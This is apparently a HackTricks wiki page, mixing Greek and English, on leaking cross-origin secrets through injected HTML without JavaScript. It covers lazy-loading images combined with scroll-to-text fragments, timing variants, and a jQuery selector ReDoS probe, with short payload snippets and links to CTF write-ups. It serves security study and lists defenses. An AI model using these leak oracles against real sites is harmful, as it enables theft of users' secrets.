Εδώ μπορείτε να βρείτε τεχνικές για την εξαγωγή πληροφοριών από μια διασυνοριακή HTML **εισάγοντας περιεχόμενο HTML**. Αυτές οι τεχνικές είναι ενδιαφέρουσες σε περιπτώσεις όπου για οποιονδήποτε λόγο μπορείτε να **εισάγετε HTML αλλά δεν μπορείτε να εισάγετε κώδικα JS**.

### Dangling Markup

{% content-ref url="../dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](../dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Image Lazy Loading

Αν χρειάζεστε να **εξάγετε περιεχόμενο** και μπορείτε να **προσθέσετε HTML πριν από το μυστικό**, θα πρέπει να ελέγξετε τις **κοινές τεχνικές dangling markup**.\
Ωστόσο, αν για οποιονδήποτε λόγο **ΠΡΕΠΕΙ** να το κάνετε **χαρακτήρα προς χαρακτήρα** (ίσως η επικοινωνία είναι μέσω χτυπήματος cache) μπορείτε να χρησιμοποιήσετε αυτό το κόλπο.

**Εικόνες** στο HTML έχουν μια ιδιότητα "**loading**" της οποίας η τιμή μπορεί να είναι "**lazy**". Σε αυτή την περίπτωση, η εικόνα θα φορτωθεί όταν την δει κάποιος και όχι ενώ η σελίδα φορτώνει:
```html
<img src=/something loading=lazy >
```
Λοιπόν, αυτό που μπορείτε να κάνετε είναι να **προσθέσετε πολλούς άχρηστους χαρακτήρες** (Για παράδειγμα **χιλιάδες "W"**) για να **γεμίσετε τη σελίδα πριν από το μυστικό ή να προσθέσετε κάτι όπως** `<br><canvas height="1850px"></canvas><br>.`\
Τότε αν για παράδειγμα η **ένεση μας εμφανιστεί πριν από τη σημαία**, η **εικόνα** θα **φορτωθεί**, αλλά αν εμφανιστεί **μετά** τη **σημαία**, η σημαία + οι άχρηστοι χαρακτήρες θα **εμποδίσουν τη φόρτωσή της** (θα χρειαστεί να πειραματιστείτε με το πόσους άχρηστους χαρακτήρες να τοποθετήσετε). Αυτό συνέβη σε [**αυτή τη γραφή**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Μια άλλη επιλογή θα ήταν να χρησιμοποιήσετε το **scroll-to-text-fragment** αν επιτρέπεται:

#### Scroll-to-text-fragment

Ωστόσο, κάνετε το **ρομπότ να έχει πρόσβαση στη σελίδα** με κάτι όπως
```
#:~:text=SECR
```
So the web page will be something like: **`https://victim.com/post.html#:~:text=SECR`**

Where post.html contains the attacker junk chars and lazy load image and then the secret of the bot is added.

What this text will do is to make the bot access any text in the page that contains the text `SECR`. As that text is the secret and it's just **below the image**, the **image will only load if the guessed secret is correct**. So there you have your oracle to **exfiltrate the secret char by char**.

Some code example to exploit this: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Image Lazy Loading Time Based

If it's **not possible to load an external image** that could indicate the attacker that the image was loaded, another option would be to try to **guess the char several times and measure that**. If the image is loaded all the requests would take longer that if the image isn't loaded. This is what was used in the [**solution of this writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **sumarized here:**

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="../regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](../regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

If `jQuery(location.hash)` is used, it's possible to find out via timing i**f some HTML content exists**, this is because if the selector `main[id='site-main']` doesn't match it doesn't need to check the rest of the **selectors**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS Injection

{% content-ref url="css-injection/" %}
[css-injection](css-injection/)
{% endcontent-ref %}

## Defenses

Υπάρχουν μετριασμοί που προτείνονται στο [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) καθώς και σε κάθε ενότητα του wiki [https://xsleaks.dev/](https://xsleaks.dev/). Ρίξτε μια ματιά εκεί για περισσότερες πληροφορίες σχετικά με το πώς να προστατευθείτε από αυτές τις τεχνικές.

## References

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}
